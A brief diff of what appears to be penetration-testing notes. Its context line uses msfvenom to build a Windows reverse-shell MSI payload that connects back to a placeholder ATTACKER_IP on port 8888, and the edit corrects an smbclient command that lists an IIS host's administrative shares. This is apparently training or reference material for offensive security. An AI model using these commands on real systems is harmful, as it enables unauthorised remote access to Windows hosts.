@@ -19,7 +19,7 @@ $ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=8888 -f msi 
 {% code title="Attacker" overflow="wrap" %}
 ```sh
 # lets first identify the name of the admin share
-$ smbclient -U admin -W test.com '//iis.test.com/ADMIN$' -L
+$ smbclient -U admin -W test.com -L '//iis.test.com'
 Sharename       Type      Comment
 ---------       ----      -------
  ADMIN$         Disk      Remote Admin
